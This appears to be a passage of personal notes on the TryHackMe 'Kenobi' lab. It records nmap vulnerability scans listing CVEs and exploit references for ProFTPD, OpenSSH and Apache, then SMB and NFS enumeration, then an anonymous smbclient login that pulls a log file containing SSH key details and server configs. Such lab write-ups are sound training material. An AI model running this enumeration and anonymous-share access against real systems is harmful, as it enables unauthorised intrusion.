---
tags:
  - Linux
  - tryhackme
---
Target IP - 10.10.76.140 (Given)

# Recon
nmap --top-ports 3000 -T5 10.10.76.140 --open //Probably could do 5-10k
	PORT     STATE SERVICE
	21/tcp   open  ftp
	22/tcp   open  ssh
	80/tcp   open  http
	111/tcp  open  rpcbind
	139/tcp  open  netbios-ssn
	445/tcp  open  microsoft-ds
	2049/tcp open  nfs


nmap -sC -sV --script vuln -p21,22,80,111,139,445,2049 --open -oN kenobi-nmap-run1 10.10.76.140
	# Nmap 7.94 scan initiated Mon Oct 30 21:19:40 2023 as: nmap -sC -sV --script vuln -p21,22,80,111,139,445,2049 --open -oN kenobi-nmap-run1 10.10.76.140
	Pre-scan script results:
	| broadcast-avahi-dos: 
	|   Discovered hosts:
	|     224.0.0.251
	|   After NULL UDP avahi packet DoS (CVE-2011-1002).
	|_  Hosts are all up (not vulnerable).
	Nmap scan report for 10.10.76.140
	Host is up (0.10s latency).
	
	PORT     STATE SERVICE     VERSION
	21/tcp   open  ftp         ProFTPD 1.3.5
	| vulners: 
	|   cpe:/a:proftpd:proftpd:1.3.5: 
	|       SAINT:FD1752E124A72FD3A26EEB9B315E8382  10.0    https://vulners.com/saint/SAINT:FD1752E124A72FD3A26EEB9B315E8382        *EXPLOIT*
	|       SAINT:950EB68D408A40399926A4CCAD3CC62E  10.0    https://vulners.com/saint/SAINT:950EB68D408A40399926A4CCAD3CC62E        *EXPLOIT*
	|       SAINT:63FB77B9136D48259E4F0D4CDA35E957  10.0    https://vulners.com/saint/SAINT:63FB77B9136D48259E4F0D4CDA35E957        *EXPLOIT*
	|       SAINT:1B08F4664C428B180EEC9617B41D9A2C  10.0    https://vulners.com/saint/SAINT:1B08F4664C428B180EEC9617B41D9A2C        *EXPLOIT*
	|       PROFTPD_MOD_COPY        10.0    https://vulners.com/canvas/PROFTPD_MOD_COPY     *EXPLOIT*
	|       PACKETSTORM:162777      10.0    https://vulners.com/packetstorm/PACKETSTORM:162777      *EXPLOIT*
	|       PACKETSTORM:132218      10.0    https://vulners.com/packetstorm/PACKETSTORM:132218      *EXPLOIT*
	|       PACKETSTORM:131567      10.0    https://vulners.com/packetstorm/PACKETSTORM:131567      *EXPLOIT*
	|       PACKETSTORM:131555      10.0    https://vulners.com/packetstorm/PACKETSTORM:131555      *EXPLOIT*
	|       PACKETSTORM:131505      10.0    https://vulners.com/packetstorm/PACKETSTORM:131505      *EXPLOIT*
	|       EDB-ID:49908    10.0    https://vulners.com/exploitdb/EDB-ID:49908      *EXPLOIT*
	|       CVE-2015-3306   10.0    https://vulners.com/cve/CVE-2015-3306
	|       1337DAY-ID-36298        10.0    https://vulners.com/zdt/1337DAY-ID-36298        *EXPLOIT*
	|       1337DAY-ID-23720        10.0    https://vulners.com/zdt/1337DAY-ID-23720        *EXPLOIT*
	|       1337DAY-ID-23544        10.0    https://vulners.com/zdt/1337DAY-ID-23544        *EXPLOIT*
	|       SSV:61050       5.0     https://vulners.com/seebug/SSV:61050    *EXPLOIT*
	|       CVE-2021-46854  5.0     https://vulners.com/cve/CVE-2021-46854
	|       CVE-2020-9272   5.0     https://vulners.com/cve/CVE-2020-9272
	|       CVE-2019-19272  5.0     https://vulners.com/cve/CVE-2019-19272
	|       CVE-2019-19271  5.0     https://vulners.com/cve/CVE-2019-19271
	|       CVE-2019-19270  5.0     https://vulners.com/cve/CVE-2019-19270
	|       CVE-2019-18217  5.0     https://vulners.com/cve/CVE-2019-18217
	|       CVE-2016-3125   5.0     https://vulners.com/cve/CVE-2016-3125
	|       CVE-2013-4359   5.0     https://vulners.com/cve/CVE-2013-4359
	|_      CVE-2017-7418   2.1     https://vulners.com/cve/CVE-2017-7418
	22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
	| vulners: 
	|   cpe:/a:openbsd:openssh:7.2p2: 
	|       PACKETSTORM:140070      7.8     https://vulners.com/packetstorm/PACKETSTORM:140070      *EXPLOIT*
	|       EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    7.8     https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    *EXPLOIT*
	|       EDB-ID:40888    7.8     https://vulners.com/exploitdb/EDB-ID:40888      *EXPLOIT*
	|       CVE-2016-8858   7.8     https://vulners.com/cve/CVE-2016-8858
	|       CVE-2016-6515   7.8     https://vulners.com/cve/CVE-2016-6515
	|       1337DAY-ID-26494        7.8     https://vulners.com/zdt/1337DAY-ID-26494        *EXPLOIT*
	|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*
	|       PRION:CVE-2023-35784    7.5     https://vulners.com/prion/PRION:CVE-2023-35784
	|       PACKETSTORM:173661      7.5     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
	|       CVE-2023-35784  7.5     https://vulners.com/cve/CVE-2023-35784
	|       CVE-2016-10009  7.5     https://vulners.com/cve/CVE-2016-10009
	|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT*
	|       SSV:92582       7.2     https://vulners.com/seebug/SSV:92582    *EXPLOIT*
	|       CVE-2016-10012  7.2     https://vulners.com/cve/CVE-2016-10012
	|       CVE-2015-8325   7.2     https://vulners.com/cve/CVE-2015-8325
	|       SSV:92580       6.9     https://vulners.com/seebug/SSV:92580    *EXPLOIT*
	|       CVE-2016-10010  6.9     https://vulners.com/cve/CVE-2016-10010
	|       1337DAY-ID-26577        6.9     https://vulners.com/zdt/1337DAY-ID-26577        *EXPLOIT*
	|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
	|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
	|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
	|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
	|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
	|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
	|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
	|       SSV:91041       5.5     https://vulners.com/seebug/SSV:91041    *EXPLOIT*
	|       PACKETSTORM:140019      5.5     https://vulners.com/packetstorm/PACKETSTORM:140019      *EXPLOIT*
	|       PACKETSTORM:136234      5.5     https://vulners.com/packetstorm/PACKETSTORM:136234      *EXPLOIT*
	|       EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    5.5     https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    *EXPLOIT*
	|       EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    5.5     https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    *EXPLOIT*
	|       EXPLOITPACK:1902C998CBF9154396911926B4C3B330    5.5     https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330    *EXPLOIT*
	|       EDB-ID:40858    5.5     https://vulners.com/exploitdb/EDB-ID:40858      *EXPLOIT*
	|       EDB-ID:40119    5.5     https://vulners.com/exploitdb/EDB-ID:40119      *EXPLOIT*
	|       EDB-ID:39569    5.5     https://vulners.com/exploitdb/EDB-ID:39569      *EXPLOIT*
	|       CVE-2016-3115   5.5     https://vulners.com/cve/CVE-2016-3115
	|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
	|       PRION:CVE-2023-27567    5.0     https://vulners.com/prion/PRION:CVE-2023-27567
	|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*
	|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
	|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
	|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT*
	|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT*
	|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
	|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
	|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
	|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708
	|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT*
	|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
	|       PRION:CVE-2023-29323    4.3     https://vulners.com/prion/PRION:CVE-2023-29323
	|       EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    *EXPLOIT*
	|       EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    *EXPLOIT*
	|       EDB-ID:40136    4.3     https://vulners.com/exploitdb/EDB-ID:40136      *EXPLOIT*
	|       EDB-ID:40113    4.3     https://vulners.com/exploitdb/EDB-ID:40113      *EXPLOIT*
	|       CVE-2023-29323  4.3     https://vulners.com/cve/CVE-2023-29323
	|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
	|       CVE-2016-6210   4.3     https://vulners.com/cve/CVE-2016-6210
	|       1337DAY-ID-25440        4.3     https://vulners.com/zdt/1337DAY-ID-25440        *EXPLOIT*
	|       1337DAY-ID-25438        4.3     https://vulners.com/zdt/1337DAY-ID-25438        *EXPLOIT*
	|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
	|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
	|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
	|       SSV:92581       2.1     https://vulners.com/seebug/SSV:92581    *EXPLOIT*
	|       CVE-2016-10011  2.1     https://vulners.com/cve/CVE-2016-10011
	|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
	|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
	|       PACKETSTORM:138006      0.0     https://vulners.com/packetstorm/PACKETSTORM:138006      *EXPLOIT*
	|       PACKETSTORM:137942      0.0     https://vulners.com/packetstorm/PACKETSTORM:137942      *EXPLOIT*
	|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        0.0     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- *EXPLOIT*
	|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
	80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
	| vulners: 
	|   cpe:/a:apache:http_server:2.4.18: 
	|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
	|       CVE-2023-25690  7.5     https://vulners.com/cve/CVE-2023-25690
	|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
	|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
	|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
	|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
	|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
	|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
	|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
	|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
	|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
	|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
	|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
	|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
	|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    7.5     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
	|       1337DAY-ID-38427        7.5     https://vulners.com/zdt/1337DAY-ID-38427        *EXPLOIT*
	|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    *EXPLOIT*
	|       EDB-ID:46676    7.2     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT*
	|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
	|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502        *EXPLOIT*
	|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
	|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
	|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
	|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
	|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
	|       CVE-2016-5387   6.8     https://vulners.com/cve/CVE-2016-5387
	|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
	|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
	|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
	|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
	|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
	|       OSV:BIT-2023-31122      6.4     https://vulners.com/osv/OSV:BIT-2023-31122
	|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
	|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224
	|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
	|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
	|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
	|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
	|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
	|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
	|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
	|       CVE-2022-36760  5.1     https://vulners.com/cve/CVE-2022-36760
	|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT*
	|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
	|       EXPLOITPACK:2666FB0676B4B582D689921651A30355    5.0     https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355    *EXPLOIT*
	|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
	|       EDB-ID:40909    5.0     https://vulners.com/exploitdb/EDB-ID:40909      *EXPLOIT*
	|       CVE-2023-31122  5.0     https://vulners.com/cve/CVE-2023-31122
	|       CVE-2022-37436  5.0     https://vulners.com/cve/CVE-2022-37436
	|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
	|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
	|       CVE-2022-28614  5.0     https://vulners.com/cve/CVE-2022-28614
	|       CVE-2022-26377  5.0     https://vulners.com/cve/CVE-2022-26377
	|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719
	|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
	|       CVE-2021-33193  5.0     https://vulners.com/cve/CVE-2021-33193
	|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
	|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
	|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
	|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
	|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
	|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
	|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189
	|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
	|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303
	|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
	|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
	|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
	|       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740
	|       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979
	|       CVE-2006-20001  5.0     https://vulners.com/cve/CVE-2006-20001
	|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
	|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
	|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
	|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
	|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT*
	|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
	|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
	|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
	|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
	|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
	|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
	|       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546
	|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
	|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
	|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
	|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
	|_      PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
	|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	| http-slowloris-check: 
	|   VULNERABLE:
	|   Slowloris DOS attack
	|     State: LIKELY VULNERABLE
	|     IDs:  CVE:CVE-2007-6750
	|       Slowloris tries to keep many connections to the target web server open and hold
	|       them open as long as possible.  It accomplishes this by opening connections to
	|       the target web server and sending a partial request. By doing so, it starves
	|       the http server's resources causing Denial Of Service.
	|       
	|     Disclosure date: 2009-09-17
	|     References:
	|       http://ha.ckers.org/slowloris/
	|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
	| http-enum: 
	|   /admin.html: Possible admin folder
	|_  /robots.txt: Robots file
	|_http-csrf: Couldn't find any CSRF vulnerabilities.
	|_http-dombased-xss: Couldn't find any DOM based XSS.
	111/tcp  open  rpcbind     2-4 (RPC #100000)
	| rpcinfo: 
	|   program version    port/proto  service
	|   100000  2,3,4        111/tcp   rpcbind
	|   100000  2,3,4        111/udp   rpcbind
	|   100000  3,4          111/tcp6  rpcbind
	|   100000  3,4          111/udp6  rpcbind
	|   100003  2,3,4       2049/tcp   nfs
	|   100003  2,3,4       2049/tcp6  nfs
	|   100003  2,3,4       2049/udp   nfs
	|   100003  2,3,4       2049/udp6  nfs
	|   100005  1,2,3      34402/udp6  mountd
	|   100005  1,2,3      35970/udp   mountd
	|   100005  1,2,3      42115/tcp6  mountd
	|   100005  1,2,3      45035/tcp   mountd
	|   100021  1,3,4      35551/tcp   nlockmgr
	|   100021  1,3,4      36651/tcp6  nlockmgr
	|   100021  1,3,4      38722/udp6  nlockmgr
	|   100021  1,3,4      39727/udp   nlockmgr
	|   100227  2,3         2049/tcp   nfs_acl
	|   100227  2,3         2049/tcp6  nfs_acl
	|   100227  2,3         2049/udp   nfs_acl
	|_  100227  2,3         2049/udp6  nfs_acl
	139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	2049/tcp open  nfs         2-4 (RPC #100003)
	Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
	
	Host script results:
	|_smb-vuln-ms10-054: false
	| smb-vuln-regsvc-dos: 
	|   VULNERABLE:
	|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
	|     State: VULNERABLE
	|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
	|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
	|       while working on smb-enum-sessions.
	|_          
	|_smb-vuln-ms10-061: false
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	# Nmap done at Mon Oct 30 21:25:39 2023 -- 1 IP address (1 host up) scanned in 359.36 seconds

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.76.140
	PORT    STATE SERVICE
	445/tcp open  microsoft-ds
	
	Host script results:
	| smb-enum-shares: 
	|   account_used: guest
	|   \\10.10.76.140\IPC$: 
	|     Type: STYPE_IPC_HIDDEN
	|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
	|     Users: 1
	|     Max Users: <unlimited>
	|     Path: C:\tmp
	|     Anonymous access: READ/WRITE
	|     Current user access: READ/WRITE
	|   \\10.10.76.140\anonymous: 
	|     Type: STYPE_DISKTREE
	|     Comment: 
	|     Users: 0
	|     Max Users: <unlimited>
	|     Path: C:\home\kenobi\share
	|     Anonymous access: READ/WRITE
	|     Current user access: READ/WRITE
	|   \\10.10.76.140\print$: 
	|     Type: STYPE_DISKTREE
	|     Comment: Printer Drivers
	|     Users: 0
	|     Max Users: <unlimited>
	|     Path: C:\var\lib\samba\printers
	|     Anonymous access: <none>
	|_    Current user access: <none>


nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.76.140
	PORT    STATE SERVICE
	111/tcp open  rpcbind
	| nfs-showmount: 
	|_  /var *
# Exploit
smbclient //10.10.76.140/anonymous
	smb: \> ls
		  .                                   D        0  Wed Sep  4 10:49:09 2019
		  ..                                  D        0  Wed Sep  4 10:56:07 2019
		  log.txt                             N    12237  Wed Sep  4 10:49:09 2019
		  9204224 blocks of size 1024. 6876720 blocks available
	smb: \> get log.txt local.txt
		getting file \log.txt of size 12237 as local.txt (26.4 KiloBytes/sec) (average 26.4 KiloBytes/sec)
	exit
	cat local.txt
		Generating public/private rsa key pair.
		Generating public/private rsa key pair.
		Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
		Created directory '/home/kenobi/.ssh'.
		Enter passphrase (empty for no passphrase): 
		Enter same passphrase again: 
		Your identification has been saved in /home/kenobi/.ssh/id_rsa.
		Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
		The key fingerprint is:
		SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
		The key's randomart image is:
		+---[RSA 2048]----+
		|                 |
		|           ..    |
		|        . o. .   |
		|       ..=o +.   |
		|      . So.o++o. |
		|  o ...+oo.Bo*o  |
		| o o ..o.o+.@oo  |
		|  . . . E .O+= . |
		|     . .   oBo.  |
		+----[SHA256]-----+
		# This is a basic ProFTPD configuration file (rename it to 
		# 'proftpd.conf' for actual use.  It establishes a single server
		# and a single anonymous login.  It assumes that you have a user/group
		# "nobody" and "ftp" for normal operation and anon.
		ServerName                      "ProFTPD Default Installation"
		ServerType                      standalone
		DefaultServer                   on
		# Port 21 is the standard FTP port.
		Port                            21
		# Don't use IPv6 support by default.
		UseIPv6                         off
		# Umask 022 is a good standard umask to prevent new dirs and files
		# from being group and world writable.
		Umask                           022
		# To prevent DoS attacks, set the maximum number of child processes
		# to 30.  If you need to allow more than 30 concurrent connections
		# at once, simply increase this value.  Note that this ONLY works
		# in standalone mode, in inetd mode you should use an inetd server
		# that allows you to limit maximum number of processes per service
		# (such as xinetd).
		MaxInstances                    30
		# Set the user and group under which the server will run.
		User                            kenobi
		Group                           kenobi
		# To cause every FTP user to be "jailed" (chrooted) into their home
		# directory, uncomment this line.
		# DefaultRoot~
		# Normally, we want files to be overwriteable.
		AllowOverwrite          on
		# Bar use of SITE CHMOD by default
		<Limit SITE_CHMOD>
		  DenyAll
		</Limit>
		# A basic anonymous configuration, no upload directories.  If you do not
		# want anonymous users, simply delete this entire <Anonymous> section.
		<Anonymous ~ftp>
		  User                          ftp
		  Group                         ftp
		
		  # We want clients to be able to login with "anonymous" as well as "ftp"
		  UserAlias                     anonymous ftp
		
		  # Limit the maximum number of anonymous logins
		  MaxClients                    10
		
		  # We want 'welcome.msg' displayed at login, and '.message' displayed
		  # in each newly chdired directory.
		  DisplayLogin                  welcome.msg
		  DisplayChdir                  .message
		
		  # Limit WRITE everywhere in the anonymous chroot
		  <Limit WRITE>
		    DenyAll
		  </Limit>
		</Anonymous>
		#
		# Sample configuration file for the Samba suite for Debian GNU/Linux.
		#
		#
		# This is the main Samba configuration file. You should read the
		# smb.conf(5) manual page in order to understand the options listed
		# here. Samba has a huge number of configurable options most of which 
		# are not shown in this example
		#
		# Some options that are often worth tuning have been included as
		# commented-out examples in this file.
		#  - When such options are commented with ";", the proposed setting
		#    differs from the default Samba behaviour
		#  - When commented with "#", the proposed setting is the default
		#    behaviour of Samba but the option is considered important
		#    enough to be mentioned here
		#
		# NOTE: Whenever you modify this file you should run the command
		# "testparm" to check that you have not made any basic syntactic 
		# errors. 
		
		#======================= Global Settings =======================
		
		[global]
		
		## Browsing/Identification ###
		
		# Change this to the workgroup/NT-domain name your Samba server will part of
		   workgroup = WORKGROUP
		
		# server string is the equivalent of the NT Description field
		        server string = %h server (Samba, Ubuntu)
		
		# Windows Internet Name Serving Support Section:
		# WINS Support - Tells the NMBD component of Samba to enable its WINS Server
		#   wins support = no
		
		# WINS Server - Tells the NMBD components of Samba to be a WINS Client
		# Note: Samba can be either a WINS Server, or a WINS Client, but NOT both
		;   wins server = w.x.y.z
		
		# This will prevent nmbd to search for NetBIOS names through DNS.
		   dns proxy = no
		
		#### Networking ####
		
		# The specific set of interfaces / networks to bind to
		# This can be either the interface name or an IP address/netmask;
		# interface names are normally preferred
		;   interfaces = 127.0.0.0/8 eth0
		
		# Only bind to the named interfaces and/or networks; you must use the
		# 'interfaces' option above to use this.
		# It is recommended that you enable this feature if your Samba machine is
		# not protected by a firewall or is a firewall itself.  However, this
		# option cannot handle dynamic or non-broadcast interfaces correctly.
		;   bind interfaces only = yes
		
		
		
		#### Debugging/Accounting ####
		
		# This tells Samba to use a separate log file for each machine
		# that connects
		   log file = /var/log/samba/log.%m
		
		# Cap the size of the individual log files (in KiB).
		   max log size = 1000
		
		# If you want Samba to only log through syslog then set the following
		# parameter to 'yes'.
		#   syslog only = no
		
		# We want Samba to log a minimum amount of information to syslog. Everything
		# should go to /var/log/samba/log.{smbd,nmbd} instead. If you want to log
		# through syslog you should set the following parameter to something higher.
		   syslog = 0
		
		# Do something sensible when Samba crashes: mail the admin a backtrace
		   panic action = /usr/share/samba/panic-action %d
		
		
		####### Authentication #######
		
		# Server role. Defines in which mode Samba will operate. Possible
		# values are "standalone server", "member server", "classic primary
		# domain controller", "classic backup domain controller", "active
		# directory domain controller". 
		#
		# Most people will want "standalone sever" or "member server".
		# Running as "active directory domain controller" will require first
		# running "samba-tool domain provision" to wipe databases and create a
		# new domain.
		   server role = standalone server
		
		# If you are using encrypted passwords, Samba will need to know what
		# password database type you are using.  
		   passdb backend = tdbsam
		
		   obey pam restrictions = yes
		
		# This boolean parameter controls whether Samba attempts to sync the Unix
		# password with the SMB password when the encrypted SMB password in the
		# passdb is changed.
		   unix password sync = yes
		
		# For Unix password sync to work on a Debian GNU/Linux system, the following
		# parameters must be set (thanks to Ian Kahan <<kahan@informatik.tu-muenchen.de> for
		# sending the correct chat script for the passwd program in Debian Sarge).
		   passwd program = /usr/bin/passwd %u
		   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
		
		# This boolean controls whether PAM will be used for password changes
		# when requested by an SMB client instead of the program listed in
		# 'passwd program'. The default is 'no'.
		   pam password change = yes
		
